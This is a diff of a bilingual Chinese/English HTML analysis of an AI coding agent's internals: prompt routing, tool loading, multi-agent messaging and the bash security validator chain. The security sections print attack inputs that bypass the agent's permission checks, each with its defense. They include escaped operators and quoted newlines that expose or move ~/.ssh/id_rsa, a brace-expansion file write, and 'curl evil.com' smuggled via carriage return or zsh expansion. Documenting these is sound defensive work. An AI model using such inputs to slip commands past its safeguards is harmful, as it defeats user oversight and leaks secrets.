 <table><thead><tr><th>Section Name</th><th>Cache Strategy</th><th>Rationale</th></tr></thead><tbody><tr><td>session_guidance</td><td>compute-once</td><td>Tool set is stable within a session</td></tr>
@@ -4709,7 +4720,7 @@ async function resolveSystemPromptSections(sections) {
 <p><tr><td>brief</td><td>compute-once</td><td>Brief mode config is session-stable</td></tr></tbody></table></p>
 <hr/>
 <h3 id="02-en-h275">7. Prompt Priority Routing (buildEffectiveSystemPrompt)</h3>
-<pre><code>buildEffectiveSystemPrompt()
+<div class="ascii-diagram"><pre>buildEffectiveSystemPrompt()
   │
   ├── overrideSystemPrompt?  ──→ [overrideSystemPrompt]  (loop mode, etc.)
   │
@@ -4721,7 +4732,7 @@ async function resolveSystemPromptSections(sections) {
   │
   ├── customSystemPrompt?  ──→ [customSystemPrompt, appendSystemPrompt?]
   │
-  └── default  ──→ [...defaultSystemPrompt, appendSystemPrompt?]</code></pre>
+  └── default  ──→ [...defaultSystemPrompt, appendSystemPrompt?]</pre></div>
 <p><strong>Special handling for Proactive mode</strong>: The agent prompt is <strong>appended</strong> rather than replaced. This is because the proactive default prompt is already a streamlined autonomous agent prompt (identity + memory + env + proactive section), and the agent adds domain-specific instructions on top of this — the same pattern used with teammates.</p>
 <hr/>
 <h3 id="02-en-h276">8. Comparison with Other LLM Prompt Engineering</h3>
@@ -4743,7 +4754,7 @@ async function resolveSystemPromptSections(sections) {
 <p><strong>DANGEROUS_ naming convention</strong>: Explicit fear-inducing naming (<code>DANGEROUS_uncachedSystemPromptSection</code>) is an API design strategy — reducing misuse by making incorrect usage feel uncomfortable. Currently, only MCP Instructions uses this marker.</p>
 <hr/>
 <h3 id="02-en-h279">9. Complete Data Flow Overview</h3>
-<pre><code>getSystemPrompt(tools, model, dirs, mcpClients)
+<div class="ascii-diagram"><pre>getSystemPrompt(tools, model, dirs, mcpClients)
   │
   ├── [Static] getSimpleIntroSection → getSimpleSystemSection → getSimpleDoingTasksSection
   │            → getActionsSection → getUsingYourToolsSection → getSimpleToneAndStyleSection
@@ -4780,7 +4791,7 @@ QueryEngine.ts → query.ts
         │     ├── API call                         → Messages API
         │     └── [Post-call] checkResponseForCacheBreak()  → Phase 2 attribution
         │
-        └── logAPISuccessAndDuration()</code></pre>
+        └── logAPISuccessAndDuration()</pre></div>
 <hr/>
 <h3 id="02-en-h280">Key Findings Summary</h3>
 <ol>
@@ -4923,7 +4934,7 @@ QueryEngine.ts → query.ts
 <p><tr><td><code>UI.tsx</code></td><td>React渲染：命令输入/输出/进度/错误</td><td>300+</td></tr></p>
 <p><tr><td><code>BashToolResultMessage.tsx</code></td><td>结果消息的React组件</td><td>~100</td></tr></tbody></table></p>
 <h4 id="03-cn-h287">2.2 命令执行的完整生命周期</h4>
-<pre><code>用户请求 "ls -la"
+<div class="ascii-diagram"><pre>用户请求 "ls -la"
       │
       ▼
 ┌─────────────────────┐
@@ -4981,7 +4992,7 @@ QueryEngine.ts → query.ts
 │                      │  - SandboxManager.annotateStderrWithSandboxFailures()
 │                      │  - 大输出持久化 (&gt;30K字符 → 磁盘文件)
 │                      │  - 图片输出检测与调整大小
-└─────────────────────┘</code></pre>
+└─────────────────────┘</pre></div>
 <h4 id="03-cn-h288">2.3 bashSecurity.ts 的 23 种安全检查</h4>
 <pre><code class="language-typescript">const BASH_SECURITY_CHECK_IDS = {
   INCOMPLETE_COMMANDS: 1,          // 不完整命令（缺少闭合引号等）
@@ -5074,7 +5085,7 @@ QueryEngine.ts → query.ts
 <hr/>
 <h3 id="03-cn-h295">4. ToolSearch 延迟加载机制</h3>
 <h4 id="03-cn-h296">4.1 shouldDefer 和 alwaysLoad 的决策逻辑</h4>
-<pre><code class="language-typescript">export function isDeferredTool(tool: Tool): boolean {
+<div class="ascii-diagram"><pre>export function isDeferredTool(tool: Tool): boolean {
   // 1. alwaysLoad: true → 永不延迟（MCP 工具可通过 _meta['anthropic/alwaysLoad'] 设置）
   if (tool.alwaysLoad === true) return false
 
@@ -5094,7 +5105,7 @@ QueryEngine.ts → query.ts
 
   // 7. 其他工具按 shouldDefer 标记决定
   return tool.shouldDefer === true
-}</code></pre>
+}</pre></div>
 <h4 id="03-cn-h297">4.2 延迟加载的工具类别</h4>
 <table><thead><tr><th>类别</th><th>示例</th><th>原因</th></tr></thead><tbody><tr><td>所有 MCP 工具</td><td><code>mcp__slack__*</code>, <code>mcp__github__*</code></td><td>工作流特定，大多数会话不需要</td></tr>
 <p><tr><td>声明 <code>shouldDefer: true</code> 的内置工具</td><td>NotebookEdit, WebFetch, WebSearch, EnterWorktree, ExitWorktree</td><td>使用频率较低</td></tr></tbody></table></p>
@@ -5189,7 +5200,7 @@ searchHint 匹配: +4分     |  全名回退匹配: +3分
 <hr/>
 <h3 id="03-cn-h306">7. 工具结果持久化</h3>
 <h4 id="03-cn-h307">7.1 maxResultSizeChars 分层体系</h4>
-<pre><code>                    系统级上限 (DEFAULT_MAX_RESULT_SIZE_CHARS = 50K)
+<div class="ascii-diagram"><pre>                    系统级上限 (DEFAULT_MAX_RESULT_SIZE_CHARS = 50K)
                                     │
                          ┌──────────┼──────────┐
                          │          │          │
@@ -5197,7 +5208,7 @@ searchHint 匹配: +4分     |  全名回退匹配: +3分
                     30K chars     20K chars   100K chars
                          │                     │
                     Math.min(声明值, 50K)  Math.min(声明值, 50K)
-                    = 30K                 = 50K</code></pre>
+                    = 30K                 = 50K</pre></div>
 <p><strong>特殊情况</strong>：</p>
 <ul>
 <li><code>FileReadTool.maxResultSizeChars = Infinity</code> — 永不持久化，因为持久化后模型需要用 Read 读取文件，形成循环读取（Read → file → Read）</li>
@@ -5399,7 +5410,7 @@ Preview (first 2.0 KB):
 <p><tr><td><code>UI.tsx</code></td><td>React rendering: command input/output/progress/errors</td><td>300+</td></tr></p>
 <p><tr><td><code>BashToolResultMessage.tsx</code></td><td>React component for result messages</td><td>~100</td></tr></tbody></table></p>
 <h4 id="03-en-h325">2.2 Complete Lifecycle of Command Execution</h4>
-<pre><code>User requests "ls -la"
+<div class="ascii-diagram"><pre>User requests "ls -la"
       │
       ▼
 ┌─────────────────────┐
@@ -5457,7 +5468,7 @@ Preview (first 2.0 KB):
 │                      │  - SandboxManager.annotateStderrWithSandboxFailures()
 │                      │  - Large output persistence (&gt;30K chars → disk file)
 │                      │  - Image output detection and resizing
-└─────────────────────┘</code></pre>
+└─────────────────────┘</pre></div>
 <h4 id="03-en-h326">2.3 23 Security Checks in bashSecurity.ts</h4>
 <pre><code class="language-typescript">const BASH_SECURITY_CHECK_IDS = {
   INCOMPLETE_COMMANDS: 1,          // Incomplete commands (missing closing quotes, etc.)
@@ -5550,7 +5561,7 @@ Preview (first 2.0 KB):
 <hr/>
 <h3 id="03-en-h333">4. ToolSearch Deferred Loading Mechanism</h3>
 <h4 id="03-en-h334">4.1 Decision Logic for shouldDefer and alwaysLoad</h4>
-<pre><code class="language-typescript">export function isDeferredTool(tool: Tool): boolean {
+<div class="ascii-diagram"><pre>export function isDeferredTool(tool: Tool): boolean {
   // 1. alwaysLoad: true → Never deferred (MCP tools can set this via _meta['anthropic/alwaysLoad'])
   if (tool.alwaysLoad === true) return false
 
@@ -5570,7 +5581,7 @@ Preview (first 2.0 KB):
 
   // 7. Other tools are determined by the shouldDefer flag
   return tool.shouldDefer === true
-}</code></pre>
+}</pre></div>
 <h4 id="03-en-h335">4.2 Categories of Deferred Tools</h4>
 <table><thead><tr><th>Category</th><th>Examples</th><th>Reason</th></tr></thead><tbody><tr><td>All MCP tools</td><td><code>mcp__slack__*</code>, <code>mcp__github__*</code></td><td>Workflow-specific, not needed in most sessions</td></tr>
 <p><tr><td>Built-in tools with <code>shouldDefer: true</code></td><td>NotebookEdit, WebFetch, WebSearch, EnterWorktree, ExitWorktree</td><td>Lower usage frequency</td></tr></tbody></table></p>
@@ -5665,7 +5676,7 @@ Description word boundary match: +2 pts</code></pre>
 <hr/>
 <h3 id="03-en-h344">7. Tool Result Persistence</h3>
 <h4 id="03-en-h345">7.1 maxResultSizeChars Tiered System</h4>
-<pre><code>                    System-level cap (DEFAULT_MAX_RESULT_SIZE_CHARS = 50K)
+<div class="ascii-diagram"><pre>                    System-level cap (DEFAULT_MAX_RESULT_SIZE_CHARS = 50K)
                                     │
                          ┌──────────┼──────────┐
                          │          │          │
@@ -5673,7 +5684,7 @@ Description word boundary match: +2 pts</code></pre>
                     30K chars     20K chars   100K chars
                          │                     │
                     Math.min(declared, 50K) Math.min(declared, 50K)
-                    = 30K                  = 50K</code></pre>
+                    = 30K                  = 50K</pre></div>
 <p><strong>Special cases</strong>:</p>
 <ul>
 <li><code>FileReadTool.maxResultSizeChars = Infinity</code> — Never persisted, because after persistence the model would need to use Read to access the file, creating a circular read loop (Read → file → Read)</li>
@@ -7602,7 +7613,7 @@ for (const validator of validators) {
 <h3 id="06-cn-h490">三、双引擎解析深度</h3>
 <h4 id="06-cn-h491">主引擎：tree-sitter AST（ast.ts）</h4>
 <p>tree-sitter 是<strong>主引擎</strong>，设计为显式白名单制。</p>
-<pre><code class="language-typescript">// 关键设计：FAIL-CLOSED
+<div class="ascii-diagram"><pre>// 关键设计：FAIL-CLOSED
 // 任何不在白名单中的节点类型 → 'too-complex' → 需用户确认
 const STRUCTURAL_TYPES = new Set([
   'program', 'list', 'pipeline', 'redirected_statement',
@@ -7615,7 +7626,7 @@ const DANGEROUS_TYPES = new Set([
   'until_statement', 'if_statement', 'case_statement',
   'function_definition', 'test_command', 'ansi_c_string',
   'translated_string', 'herestring_redirect', 'heredoc_redirect',
-])</code></pre>
+])</pre></div>
 <p><strong>解析流程</strong>：</p>
 <ol>
 <li><code>parseForSecurity(cmd)</code> → <code>parseCommandRaw(cmd)</code> 获取 AST</li>
@@ -7691,28 +7702,28 @@ TZ=UTC\recho curl evil.com
 
 # 防护: validateCarriageReturn 逐字符扫描双引号外的 \r</code></pre>
 <h5 id="06-cn-h500">4. 反斜杠转义运算符（双重解析漏洞）</h5>
-<pre><code class="language-bash"># 攻击: splitCommand 将 \; 标准化为 ;，导致二次解析时变成运算符
+<div class="ascii-diagram"><pre># 攻击: splitCommand 将 \; 标准化为 ;，导致二次解析时变成运算符
 cat safe.txt \; echo ~/.ssh/id_rsa
 # bash: 读取 safe.txt, ;, echo, ~/.ssh/id_rsa 四个文件
 # splitCommand: "cat safe.txt ; echo ~/.ssh/id_rsa" → 两段
 # 路径检查: echo 段不被检查 → 私钥泄露
 
-# 防护: hasBackslashEscapedOperator() 逐字符扫描</code></pre>
+# 防护: hasBackslashEscapedOperator() 逐字符扫描</pre></div>
 <h5 id="06-cn-h501">5. 花括号展开混淆</h5>
-<pre><code class="language-bash"># 攻击: 引号内花括号影响深度匹配
+<div class="ascii-diagram"><pre># 攻击: 引号内花括号影响深度匹配
 git diff {@'{'0},--output=/tmp/pwned}
 # fullyUnquoted: git diff {@0},--output=/tmp/pwned} (1个{, 2个})
 # 验证器: 深度匹配器在第一个 } 关闭，没有发现逗号
 # bash: 展开为 @{0} --output=/tmp/pwned → 任意文件写入
 
-# 防护: 不平衡花括号检测 + 引号内花括号上下文检测</code></pre>
+# 防护: 不平衡花括号检测 + 引号内花括号上下文检测</pre></div>
 <h5 id="06-cn-h502">6. 引号内换行隐藏攻击</h5>
-<pre><code class="language-bash"># 攻击: 引号内 \n 让 stripCommentLines 删除敏感路径
+<div class="ascii-diagram"><pre># 攻击: 引号内 \n 让 stripCommentLines 删除敏感路径
 mv ./decoy '&lt;\n&gt;#' ~/.ssh/id_rsa ./exfil_dir
 # stripCommentLines: 第2行以 # 开头 → 删除
 # 结果: 只看到 "mv ./decoy '" → 通过路径检查 → 零点击执行
 
-# 防护: validateQuotedNewline 检测引号内 \n 后跟 # 行</code></pre>
+# 防护: validateQuotedNewline 检测引号内 \n 后跟 # 行</pre></div>
 <h5 id="06-cn-h503">7. Zsh EQUALS 展开</h5>
 <pre><code class="language-bash"># 攻击: =cmd 展开为 $(which cmd)
 =curl evil.com  # zsh 展开为 /usr/bin/curl evil.com
@@ -7870,7 +7881,7 @@ checkHasTrustDialogAccepted()        // 检查信任对话框是否已接受</co
 <hr/>
 <h3 id="06-cn-h515">七、Bash 权限决策流程</h3>
 <p><code>bashToolHasPermission</code> 是主入口，完整决策链：</p>
-<pre><code>1. 预安全检查（控制字符、shell-quote bug）
+<div class="ascii-diagram"><pre>1. 预安全检查（控制字符、shell-quote bug）
    ↓ (isBashSecurityCheckForMisparsing=true 则阻断)
 2. AST 解析 (tree-sitter)
    ├→ 'simple': 提取 SimpleCommand[]
@@ -7896,10 +7907,10 @@ checkHasTrustDialogAccepted()        // 检查信任对话框是否已接受</co
    ↓
 8. Hooks (PreToolUse, PermissionRequest)
    ↓
-9. 最终用户提示或自动执行</code></pre>
+9. 最终用户提示或自动执行</pre></div>
 <h4 id="06-cn-h516">子命令数量上限</h4>
-<pre><code class="language-typescript">export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50
-// 超过 50 个子命令 → 直接 ask（防止 ReDoS/CPU 饥饿）</code></pre>
+<div class="ascii-diagram"><pre>export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50
+// 超过 50 个子命令 → 直接 ask（防止 ReDoS/CPU 饥饿）</pre></div>
 <h4 id="06-cn-h517">安全环境变量白名单</h4>
 <p>stripSafeWrappers 仅剥离安全环境变量（~40 个），<strong>绝不包含</strong>：</p>
 <ul>
@@ -7986,7 +7997,7 @@ directly to the user before continuing.`</code></pre>
 <hr/>
 <h3 id="06-cn-h527">十一、安全架构总结</h3>
 <h4 id="06-cn-h528">防御深度层次</h4>
-<pre><code>Layer 1: Prompt 级     → 系统提示注入防护、Unicode 清理
+<div class="ascii-diagram"><pre>Layer 1: Prompt 级     → 系统提示注入防护、Unicode 清理
 Layer 2: 解析级        → 双引擎解析（tree-sitter + shell-quote）
 Layer 3: 验证器级      → 23 个安全验证器链
 Layer 4: 权限规则级    → deny &gt; ask &gt; allow 优先级
@@ -7994,7 +8005,7 @@ Layer 5: 路径级        → checkPathConstraints + 只读验证
 Layer 6: 模式级        → acceptEdits / default / bypassPermissions
 Layer 7: Hooks 级      → PreToolUse / PermissionRequest hooks
 Layer 8: 沙箱级        → OS 级文件系统 + 网络隔离
-Layer 9: 分类器级      → AI 自动审批（auto 模式）</code></pre>
+Layer 9: 分类器级      → AI 自动审批（auto 模式）</pre></div>
 <h4 id="06-cn-h529">关键安全不变量</h4>
 <ol>
 <li><strong>Deny 优先</strong>：deny 规则在所有路径上优先于 allow</li>
@@ -8105,7 +8116,7 @@ for (const validator of validators) {
 <h3 id="06-en-h541">3. Dual-Engine Parsing In-Depth</h3>
 <h4 id="06-en-h542">Primary Engine: tree-sitter AST (ast.ts)</h4>
 <p>tree-sitter is the <strong>primary engine</strong>, designed with an explicit allowlist approach.</p>
-<pre><code class="language-typescript">// Key design: FAIL-CLOSED
+<div class="ascii-diagram"><pre>// Key design: FAIL-CLOSED
 // Any node type not in the allowlist → 'too-complex' → requires user confirmation
 const STRUCTURAL_TYPES = new Set([
   'program', 'list', 'pipeline', 'redirected_statement',
@@ -8118,7 +8129,7 @@ const DANGEROUS_TYPES = new Set([
   'until_statement', 'if_statement', 'case_statement',
   'function_definition', 'test_command', 'ansi_c_string',
   'translated_string', 'herestring_redirect', 'heredoc_redirect',
-])</code></pre>
+])</pre></div>
 <p><strong>Parsing Flow</strong>:</p>
 <ol>
 <li><code>parseForSecurity(cmd)</code> → <code>parseCommandRaw(cmd)</code> to obtain the AST</li>
@@ -8194,28 +8205,28 @@ TZ=UTC\recho curl evil.com
 
 # Defense: validateCarriageReturn scans character-by-character for \r outside double quotes</code></pre>
 <h5 id="06-en-h551">4. Backslash-Escaped Operators (double-parsing vulnerability)</h5>
-<pre><code class="language-bash"># Attack: splitCommand normalizes \; to ;, causing operator interpretation on second parse
+<div class="ascii-diagram"><pre># Attack: splitCommand normalizes \; to ;, causing operator interpretation on second parse
 cat safe.txt \; echo ~/.ssh/id_rsa
 # bash: reads safe.txt, ;, echo, ~/.ssh/id_rsa as four files
 # splitCommand: "cat safe.txt ; echo ~/.ssh/id_rsa" → two segments
 # Path check: echo segment not checked → private key leakage
 
-# Defense: hasBackslashEscapedOperator() character-by-character scan</code></pre>
+# Defense: hasBackslashEscapedOperator() character-by-character scan</pre></div>
 <h5 id="06-en-h552">5. Brace Expansion Confusion</h5>
-<pre><code class="language-bash"># Attack: braces inside quotes affect depth matching
+<div class="ascii-diagram"><pre># Attack: braces inside quotes affect depth matching
 git diff {@'{'0},--output=/tmp/pwned}
 # fullyUnquoted: git diff {@0},--output=/tmp/pwned} (1 {, 2 })
 # Validator: depth matcher closes at first }, doesn't find the comma
 # bash: expands to @{0} --output=/tmp/pwned → arbitrary file write
 
-# Defense: unbalanced brace detection + brace-inside-quotes context detection</code></pre>
+# Defense: unbalanced brace detection + brace-inside-quotes context detection</pre></div>
 <h5 id="06-en-h553">6. Quoted Newline Hidden Attack</h5>
-<pre><code class="language-bash"># Attack: \n inside quotes causes stripCommentLines to remove sensitive paths
+<div class="ascii-diagram"><pre># Attack: \n inside quotes causes stripCommentLines to remove sensitive paths
 mv ./decoy '&lt;\n&gt;#' ~/.ssh/id_rsa ./exfil_dir
 # stripCommentLines: line 2 starts with # → removed
 # Result: only sees "mv ./decoy '" → passes path check → zero-click execution
 
-# Defense: validateQuotedNewline detects \n inside quotes followed by a # line</code></pre>
+# Defense: validateQuotedNewline detects \n inside quotes followed by a # line</pre></div>
 <h5 id="06-en-h554">7. Zsh EQUALS Expansion</h5>
 <pre><code class="language-bash"># Attack: =cmd expands to $(which cmd)
 =curl evil.com  # zsh expands to /usr/bin/curl evil.com
@@ -8373,7 +8384,7 @@ checkHasTrustDialogAccepted()        // Check if trust dialog has been accepted<
 <hr/>
 <h3 id="06-en-h566">7. Bash Permission Decision Flow</h3>
 <p><code>bashToolHasPermission</code> is the main entry point, with the complete decision chain:</p>
-<pre><code>1. Pre-security checks (control characters, shell-quote bug)
+<div class="ascii-diagram"><pre>1. Pre-security checks (control characters, shell-quote bug)
    ↓ (blocked if isBashSecurityCheckForMisparsing=true)
 2. AST parsing (tree-sitter)
    ├→ 'simple': extract SimpleCommand[]
@@ -8399,10 +8410,10 @@ checkHasTrustDialogAccepted()        // Check if trust dialog has been accepted<
    ↓
 8. Hooks (PreToolUse, PermissionRequest)
    ↓
-9. Final user prompt or auto-execute</code></pre>
+9. Final user prompt or auto-execute</pre></div>
 <h4 id="06-en-h567">Subcommand Count Limit</h4>
-<pre><code class="language-typescript">export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50
-// More than 50 subcommands → direct ask (prevents ReDoS/CPU starvation)</code></pre>
+<div class="ascii-diagram"><pre>export const MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50
+// More than 50 subcommands → direct ask (prevents ReDoS/CPU starvation)</pre></div>
 <h4 id="06-en-h568">Safe Environment Variable Allowlist</h4>
 <p>stripSafeWrappers only strips safe environment variables (~40), and <strong>never includes</strong>:</p>
 <ul>
@@ -8489,7 +8500,7 @@ directly to the user before continuing.`</code></pre>
 <hr/>
 <h3 id="06-en-h578">11. Security Architecture Summary</h3>
 <h4 id="06-en-h579">Defense-in-Depth Layers</h4>
-<pre><code>Layer 1: Prompt level      → System prompt injection protection, Unicode sanitization
+<div class="ascii-diagram"><pre>Layer 1: Prompt level      → System prompt injection protection, Unicode sanitization
 Layer 2: Parsing level     → Dual-engine parsing (tree-sitter + shell-quote)
 Layer 3: Validator level   → 23 security validators chain
 Layer 4: Permission rules  → deny &gt; ask &gt; allow priority
@@ -8497,7 +8508,7 @@ Layer 5: Path level        → checkPathConstraints + read-only validation
 Layer 6: Mode level        → acceptEdits / default / bypassPermissions
 Layer 7: Hooks level       → PreToolUse / PermissionRequest hooks
 Layer 8: Sandbox level     → OS-level filesystem + network isolation
-Layer 9: Classifier level  → AI auto-approval (auto mode)</code></pre>
+Layer 9: Classifier level  → AI auto-approval (auto mode)</pre></div>
 <h4 id="06-en-h580">Key Security Invariants</h4>
 <ol>
 <li><strong>Deny takes priority</strong>: Deny rules take precedence over allow across all paths</li>
@@ -8536,7 +8547,7 @@ Layer 9: Classifier level  → AI auto-approval (auto mode)</code></pre>
 <a href="#07-cn-h615" class="toc-l1">10. 内置 Agent 注册表</a>
 <a href="#07-cn-h616" class="toc-l1">总结</a></nav><h3 id="07-cn-h581">1. 架构总览</h3>
 <p>Claude Code 的多 Agent 协作系统由以下核心模块构成：</p>
-<pre><code>AgentTool.tsx (900+ 行)  ─── 统一入口，所有 Agent 生命周期管理
+<div class="ascii-diagram"><pre>AgentTool.tsx (900+ 行)  ─── 统一入口，所有 Agent 生命周期管理
   ├── runAgent.ts          ─── 底层执行引擎：query() 循环 + MCP 初始化
   ├── forkSubagent.ts      ─── Fork 模式的消息构建与缓存策略
   ├── agentToolUtils.ts    ─── 工具池裁剪、异步生命周期管理
@@ -8549,7 +8560,7 @@ spawnMultiAgent.ts         ─── Teammate 的 tmux/iTerm2/进程内生成
 SendMessageTool.ts         ─── 跨 Agent 消息路由（本地/UDS/Bridge）
 TeamCreateTool.ts          ─── 团队创建与 TeamFile 管理
 worktree.ts                ─── Git Worktree 隔离：创建/检测变更/清理
-bridge/ (31 files)         ─── Remote Control REPL 桥接（非 Agent 间通信）</code></pre>
+bridge/ (31 files)         ─── Remote Control REPL 桥接（非 Agent 间通信）</pre></div>
 <hr/>
 <h3 id="07-cn-h582">2. AgentTool 的 6 种运行模式</h3>
 <h4 id="07-cn-h583">模式对比表</h4>
@@ -8563,7 +8574,7 @@ bridge/ (31 files)         ─── Remote Control REPL 桥接（非 Agent 间�
 <p><tr><td><strong>结果返回</strong></td><td>直接返回 tool_result</td><td><code><task-notification></code> 用户消息</td><td><code><task-notification></code></td><td><code><task-notification></code> + worktree 路径</td><td>远程轮询</td><td>mailbox</td></tr></tbody></table></p>
 <h4 id="07-cn-h584">模式选择的核心路由逻辑</h4>
 <p>在 <code>AgentTool.call()</code> 中，路由决策按以下优先级执行：</p>
-<pre><code class="language-typescript">// 1. Teammate 路由 (最高优先级)
+<div class="ascii-diagram"><pre>// 1. Teammate 路由 (最高优先级)
 if (teamName &amp;&amp; name) {
   return spawnTeammate({ ... })  // → tmux / in-process
 }
@@ -8584,7 +8595,7 @@ if (effectiveIsolation === 'worktree') {
 
 // 5. 同步/异步决策
 const shouldRunAsync = (run_in_background || selectedAgent.background
-  || isCoordinator || forceAsync || assistantForceAsync) &amp;&amp; !isBackgroundTasksDisabled</code></pre>
+  || isCoordinator || forceAsync || assistantForceAsync) &amp;&amp; !isBackgroundTasksDisabled</pre></div>
 <hr/>
 <h3 id="07-cn-h585">3. Fork Agent 的缓存创新</h3>
 <h4 id="07-cn-h586">3.1 核心设计目标</h4>
@@ -8608,13 +8619,13 @@ availableTools: isForkPath ? toolUseContext.options.tools : workerTools,
 <p>这是因为 <code>resolveAgentTools()</code> 在 <code>permissionMode: 'bubble'</code> 下会产生与父级不同的工具定义序列化，导致缓存失效。</p>
 <h4 id="07-cn-h588">3.3 分叉消息的构建 (<code>buildForkedMessages</code>)</h4>
 <p>Fork 的消息结构精心设计以最大化缓存命中：</p>
-<pre><code>[...父级历史消息]
+<div class="ascii-diagram"><pre>[...父级历史消息]
 ├── assistant (完整保留所有 tool_use, thinking, text blocks)
 └── user
     ├── tool_result[0]: "Fork started — processing in background"  ← 所有子 Agent 相同
     ├── tool_result[1]: "Fork started — processing in background"  ← 所有子 Agent 相同
     ├── ...
-    └── text: "&lt;fork-boilerplate&gt;...\n&lt;fork-directive&gt;只有这里不同&lt;/fork-directive&gt;"  ← 唯一差异点</code></pre>
+    └── text: "&lt;fork-boilerplate&gt;...\n&lt;fork-directive&gt;只有这里不同&lt;/fork-directive&gt;"  ← 唯一差异点</pre></div>
 <p>关键实现细节：</p>
 <ul>
 <li><strong>统一占位结果</strong>: 所有 <code>tool_result</code> 使用相同的 <code>FORK_PLACEHOLDER_RESULT = 'Fork started — processing in background'</code></li>
@@ -8717,16 +8728,16 @@ const workerTools = Array.from(ASYNC_AGENT_ALLOWED_TOOLS)
 <h3 id="07-cn-h597">5. Team 通信机制</h3>
 <h4 id="07-cn-h598">5.1 SendMessage 的寻址模式</h4>
 <p><code>SendMessageTool</code> 支持四种寻址协议：</p>
-<pre><code class="language-typescript">const inputSchema = z.object({
+<div class="ascii-diagram"><pre>const inputSchema = z.object({
   to: z.string()  // 寻址目标
   // 支持的格式：
   // "researcher"           → 按名称寻址 Teammate
   // "*"                    → 广播给所有 Teammates
   // "uds:/path/to.sock"   → Unix Domain Socket (本地跨会话)
   // "bridge:session_..."   → Remote Control 跨机器通信
-})</code></pre>
+})</pre></div>
 <h4 id="07-cn-h599">5.2 消息路由的完整决策树</h4>
-<pre><code>SendMessage.call(input)
+<div class="ascii-diagram"><pre>SendMessage.call(input)
 │
 ├── 1. Bridge 路由 (feature UDS_INBOX + addr.scheme === 'bridge')
 │   └── postInterClaudeMessage(target, message)  → 跨机器 HTTP API
@@ -8746,7 +8757,7 @@ const workerTools = Array.from(ASYNC_AGENT_ALLOWED_TOOLS)
 │   └── handleBroadcast()  → 遍历 teamFile.members, writeToMailbox 每个
 │
 └── 5. Teammate 路由 (默认)
-    └── handleMessage()    → writeToMailbox(recipientName, ...)</code></pre>
+    └── handleMessage()    → writeToMailbox(recipientName, ...)</pre></div>
 <h4 id="07-cn-h600">5.3 Mailbox 通信</h4>
 <p>Teammate 之间的通信基于文件系统 mailbox:</p>
 <pre><code class="language-typescript">// handleMessage 中的核心操作
@@ -8760,7 +8771,7 @@ await writeToMailbox(recipientName, {
 <p>Mailbox 文件存储在 team 目录下，每个 Teammate 有自己的收件箱。消息自动投递 -- 不需要主动检查收件箱。</p>
 <h4 id="07-cn-h601">5.4 tmux vs in-process 的选择策略</h4>
 <p><code>spawnMultiAgent.ts</code> 中的后端检测逻辑：</p>
-<pre><code class="language-typescript">let detectionResult = await detectAndGetBackend()
+<div class="ascii-diagram"><pre>let detectionResult = await detectAndGetBackend()
 // 检测结果可能包含: needsIt2Setup
 
 // 后端类型 (BackendType):
@@ -8771,7 +8782,7 @@ await writeToMailbox(recipientName, {
 // tmux 生成流程:
 // 1. ensureSession(sessionName)        → 确保 tmux session 存在
 // 2. createTeammatePaneInSwarmView()   → 在 swarm 视图中创建 pane
-// 3. sendCommandToPane(paneId, cmd)    → 向 pane 发送 spawn 命令</code></pre>
+// 3. sendCommandToPane(paneId, cmd)    → 向 pane 发送 spawn 命令</pre></div>
 <p><strong>进程内 Teammate 的特殊限制</strong>:</p>
 <pre><code class="language-typescript">// 不能生成后台 Agent
 if (isInProcessTeammate() &amp;&amp; teamName &amp;&amp; run_in_background === true) {
@@ -8797,7 +8808,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <h3 id="07-cn-h603">6. Worktree 隔离</h3>
 <h4 id="07-cn-h604">6.1 创建流程</h4>
 <p><code>createAgentWorktree(slug)</code> 的完整流程：</p>
-<pre><code>1. validateWorktreeSlug(slug)           → 防止路径遍历攻击
+<div class="ascii-diagram"><pre>1. validateWorktreeSlug(slug)           → 防止路径遍历攻击
 2. hasWorktreeCreateHook()?
    ├── 是: executeWorktreeCreateHook()  → 用户自定义 VCS 钩子
    └── 否: Git worktree 流程
@@ -8811,7 +8822,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
               iii. (可选) git sparse-checkout set --cone -- &lt;paths&gt;
        c. symlinkDirectories()          → 符号链接 node_modules 等避免磁盘膨胀
        d. copyWorktreeIncludeFiles()    → 复制 .worktreeinclude 匹配的 gitignored 文件
-       e. saveCurrentProjectConfig()    → 复制 CLAUDE.md 等配置</code></pre>
+       e. saveCurrentProjectConfig()    → 复制 CLAUDE.md 等配置</pre></div>
 <h4 id="07-cn-h605">6.2 防止多 Agent Git 冲突</h4>
 <p>Worktree 通过以下机制防止冲突：</p>
 <ol>
@@ -8822,7 +8833,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <li><strong><code>findCanonicalGitRoot()</code></strong>: 确保所有 worktree 都在主仓库的 <code>.claude/worktrees/</code> 下创建，而非在已有 worktree 内嵌套</li>
 </ol>
 <h4 id="07-cn-h606">6.3 清理流程</h4>
-<pre><code class="language-typescript">async cleanupWorktreeIfNeeded(): Promise&lt;{ worktreePath?, worktreeBranch? }&gt; {
+<div class="ascii-diagram"><pre>async cleanupWorktreeIfNeeded(): Promise&lt;{ worktreePath?, worktreeBranch? }&gt; {
   // Hook-based worktree: 始终保留（无法检测 VCS 变更）
   if (hookBased) return { worktreePath }
 
@@ -8837,7 +8848,7 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
   }
   // 有变更 → 保留 worktree, 返回路径和分支供用户查看
   return { worktreePath, worktreeBranch }
-}</code></pre>
+}</pre></div>
 <p><code>hasWorktreeChanges()</code> 检查两个维度：</p>
 <ul>
 <li><code>git status --porcelain</code>: 检测未提交的修改</li>
@@ -8880,9 +8891,9 @@ if (isTeammate() &amp;&amp; teamName &amp;&amp; name) {
 <p><tr><td><strong>类型</strong></td><td><code>types.ts</code></td><td>所有类型定义：WorkResponse, BridgeConfig, SessionHandle 等</td></tr></tbody></table></p>
 <h4 id="07-cn-h610">7.3 两代架构</h4>
 <p><strong>v1 (Env-based)</strong>: <code>replBridge.ts</code></p>
-<pre><code>注册环境 → 轮询 Work → 确认 → 生成子进程 → WebSocket 通信 → 心跳</code></pre>
+<div class="ascii-diagram"><pre>注册环境 → 轮询 Work → 确认 → 生成子进程 → WebSocket 通信 → 心跳</pre></div>
 <p><strong>v2 (Env-less)</strong>: <code>remoteBridgeCore.ts</code></p>
